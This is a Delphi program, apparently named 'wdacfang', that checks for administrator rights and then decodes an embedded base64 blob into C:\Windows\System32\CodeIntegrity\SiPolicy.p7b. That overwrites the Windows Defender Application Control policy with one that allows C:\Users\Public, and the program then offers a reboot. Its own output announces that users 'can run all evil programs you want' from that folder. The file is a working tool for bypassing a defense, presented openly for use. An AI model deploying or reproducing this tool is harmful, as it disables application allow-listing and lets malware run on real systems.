program wdacfang;

uses
  System.SysUtils,
  System.Classes,
  System.NetEncoding,
  Windows,
  ShellAPI;

function IsUserAdmin: Boolean;
var
  TokenHandle: THandle;
  TokenElev: TOKEN_ELEVATION;
  ReturnLength: DWORD;
begin
  Result := False;
  if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, TokenHandle) then
  try
    if GetTokenInformation(TokenHandle, TokenElevation, @TokenElev, SizeOf(TokenElev), ReturnLength) then
      Result := TokenElev.TokenIsElevated <> 0;
  finally
    CloseHandle(TokenHandle);
  end;
end;

procedure DecodeBase64ToFile(const Base64Str, FilePath: string);
var
  Decoder: TBase64Encoding;
  FileStream: TFileStream;
  DecodedBytes: TBytes;
begin
  Decoder := TBase64Encoding.Create;
  try
    DecodedBytes := Decoder.DecodeStringToBytes(Base64Str);
    FileStream := TFileStream.Create(FilePath, fmCreate);
    try
      FileStream.WriteBuffer(DecodedBytes[0], Length(DecodedBytes));
    finally
      FileStream.Free;
    end;
  finally
    Decoder.Free;
  end;
end;

procedure RebootSystem;
begin
  if MessageBox(0, 'Restart Windows?', 'Reboot', MB_YESNO or MB_ICONQUESTION) = IDYES then
  begin
    ShellExecute(0, 'open', 'shutdown', PChar('/r /t 0'), nil, SW_HIDE);
  end;
end;


const Base64Input: string='BwAAAA43RKLJRAZMtVH2AW5WMHbk9wcuTBkgTbfJb0SmxaI0BCiMkgkAAAACAAAAIAAAAAIAAAAA'+
'AAAAAwAKAEAAAAAMAAAAAQorBgEEAYI3CgMGDAAAAAEKKwYBBAGCNwoDBQwAAAABCisGAQQBgjc9'+
'BAEMAAAAAQorBgEEAYI3PQUBDAAAAAEKKwYBBAGCNwoDFQwAAAABCisGAQQBgjdMAwEMAAAAAQor'+
'BgEEAYI3TAUBDAAAAAEKKwYBBAGCN0wLAQwAAAABCisGAQQBgjcKAyoBAAAAAAAAAAAAAAAAAAAA'+
'AAAAAAAAAAACAAAAIgAAAFIAZQBmAHIAZQBzAGgAUABvAGwAaQBjAHkALgBlAHgAZQAAAAAAAAAA'+
'AGJKAAAKAAAAAAABAAAABgAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEA'+
'AAAGAAAAAQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAYAAAABAAAAAwAA'+
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAABgAAAAEAAAABAAAAAAAAAAAAAAAAAAAA'+
'AAAAAAAAAAAAAAAAAAAAAAEAAAAFAAAAAQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'+
'AAAAAQAAAAQAAAABAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAABgAAAAEA'+
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAGAAAAAQAAAAIAAAAAAAAAAAAA'+
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAYAAAABAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'+
'AAAAAAAAAAABAAAABgAAAAEAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAF'+
'AAAAAQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAA4AAAABAAAAAAAAAAAA'+
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAADgAAAAEAAAACAAAAAAAAAAAAAAAAAAAAAAAA'+
'AAAAAAAAAAAAAAAAAAEAAAAOAAAAAQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'+
'AQAAAA4AAAABAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAADgAAAAEAAAAA'+
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAOAAAAAQAAAAIAAAAAAAAAAAAAAAAA'+
'AAAAAAAAAAAAAAAAAAAAAAAAAQAAAA4AAAABAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'+
'AAAAAAABAAAADgAAAAEAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAEAAAA'+
'AQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAA4AAAABAAAABQAAAAAAAAAA'+
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAPye3j3MoJGGstO/m3OKIFDLGlVNotyttV8/'+
'cu4XchN4AQAAAAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAYAAAABAAAABAAA'+
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAADgAAAAEAAAAEAAAAAAAAAAAAAAAAAAAA'+
'AAAAAAAAAAAAAAAAAAAAAAEAAAAHAAAAAQAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'+
'AAAAAQAAAAoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAKAAAAAAAAAAAA'+
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'+
'AAAAAAAAAAAAAQAAAAYAAAABAAAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAA'+
'BwAAAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAHAAAAAQAAAAgAAAAA'+
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAD29xekOtmr3cjO/d4cUFRiU159Ewfm'+
'MPlUSi0U/ovybgAAAAAAAAAAAAAAACoAAABNAGkAYwByAG8AcwBvAGYAdAAgAEMAbwByAHAAbwBy'+
'AGEAdABpAG8AbgAAAAAAAAAAAAAAAAAAAAEAAAABAAAAAAAAAAEAAAAVAAAAgwAAAAAAAAAMgAAA'+
'CwAAAAAAAAAAAAAAAQAAAAAAAAACAAAAAAAAAAMAAAAAAAAABAAAAAAAAAAFAAAAAAAAAAsAAAAA'+
'AAAADAAAAAAAAAANAAAAAAAAAA4AAAAAAAAAGQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'+
'AAAAAAAAAAAAAAwAAAAAAAAADIAAABUAAAAGAAAAAAAAAAcAAAAAAAAACAAAAAAAAAAJAAAAAAAA'+
'AAoAAAAAAAAAEwAAAAAAAAAPAAAAAAAAABAAAAAAAAAAEQAAAAAAAAASAAAAAAAAABUAAAAAAAAA'+
'FAAAAAAAAAAWAAAAAAAAABsAAAAAAAAAHAAAAAAAAAAdAAAAAAAAABcAAAAAAAAAGAAAAAAAAAAe'+
'AAAAAAAAAB8AAAAAAAAAGgAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'+
'AAAAAAAAAgAAABQAAABQAG8AbABpAGMAeQBJAG4AZgBvAAAAAAAWAAAASQBuAGYAbwByAG0AYQB0'+
'AGkAbwBuAAAAAAAAAAQAAABJAGQAAAAAAAMAAAAUAAAAMgAwADIANQAtADAAMQAtADAAMQAAAAAA'+
'FAAAAFAAbwBsAGkAYwB5AEkAbgBmAG8AAAAAABYAAABJAG4AZgBvAHIAbQBhAHQAaQBvAG4AAAAA'+
'AAAACAAAAE4AYQBtAGUAAAAAAAMAAAAuAAAAVwBpAG4AZABvAHcAcwBXAG8AcgBrAHMAXwAyADAA'+
'MgA1AC0AMAAxAC0AMAAxAAAAAAAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'+
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'+
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'+
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'+
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'+
'AAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'+
'AAAAAAAAAAAAAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAO'+
'N0SiyUQGTLVR9gFuVjB2DjdEoslEBky1UfYBblYwdgAAAAAHAAAAMAAAACUATwBTAEQAUgBJAFYA'+
'RQAlAFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXAAqAAAAAAAAAAAAAAAAAAgAAAA=';

var
  OutputFilePath: string;
begin
  try

    if IsUserAdmin then
      OutputFilePath := 'c:\\Windows\\System32\\CodeIntegrity\\SiPolicy.p7b'
    else
    begin
      Writeln('You need administrative prompt, sorry...');
      exit;
    end;

    DecodeBase64ToFile(Base64Input, OutputFilePath);
    Writeln('Policy saved in: ', OutputFilePath);
    writeln;

    Writeln('Now you can run all evil programs you want from C:\USERS\PUBLIC...');
    RebootSystem;
  except
    on E: Exception do
      Writeln('Error: ', E.Message);
  end;
end.

